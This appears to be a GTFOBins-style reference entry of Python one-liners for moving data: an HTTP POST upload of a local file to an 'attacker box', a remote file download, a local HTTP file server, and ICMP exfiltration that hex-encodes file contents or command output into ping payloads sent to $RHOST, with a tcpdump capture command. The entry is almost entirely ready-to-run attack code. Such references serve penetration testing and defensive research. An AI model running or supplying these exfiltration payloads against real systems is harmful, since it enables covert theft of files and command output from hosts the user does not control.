---
description: The payloads are compatible with both Python version 2 and 3.
functions:
  file-upload:
    - description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        python -c 'import sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
        else: import urllib as u, urllib2 as r
        r.urlopen(e["$URL"], bytes(u.urlencode({"d":open(e["$LFILE"]).read()}).encode()))'
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        python -c 'import sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r
        else: import urllib as r
        r.urlretrieve(e["$URL"], e["$LFILE"])'
  server:
    - description: Serve files in the local folder running an HTTP server.
      code: |
        python -c 'import sys; from os import environ as e
        if sys.version_info.major == 3: import http.server as s, socketserver as ss
        else: import SimpleHTTPServer as s, SocketServer as ss
        ss.TCPServer(("", int(e["$LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()'
  data-exfiltration:
    - description: |
        Capture ICMP packets embedded in ping requests.
        Run `sudo timeout 10 tcpdump -i any -l -n -XX 'icmp' 2>/dev/null | grep '0x0060:'` on the attacker box to collect the data.             
        ⚠️ Increase the timeout flag based on the amount of data.                             
        ⚠️ Manual parsing or reconstruction is required.  

        Send local file content over ICMP using hex-encoded payloads.
      code: |
        python -c 'import sys,os;d=open("$FILE","rb").read();
        d=d.hex() if sys.version_info[0]==3 else d.encode("hex");
        [os.system("ping -c1 -p "+d[i:i+16]+" $RHOST") for i in range(0,len(d),16)]'

    - description: Send command output over ICMP using hex-encoded payloads.
      code: |
        python -c 'import sys,os;d=os.popen("$CMD").read();
        d=d.encode().hex() if sys.version_info[0]==3 else d.encode("hex");
        [os.system("ping -c1 -p "+d[i:i+16]+" $RHOST") for i in range(0,len(d),16)]'
---
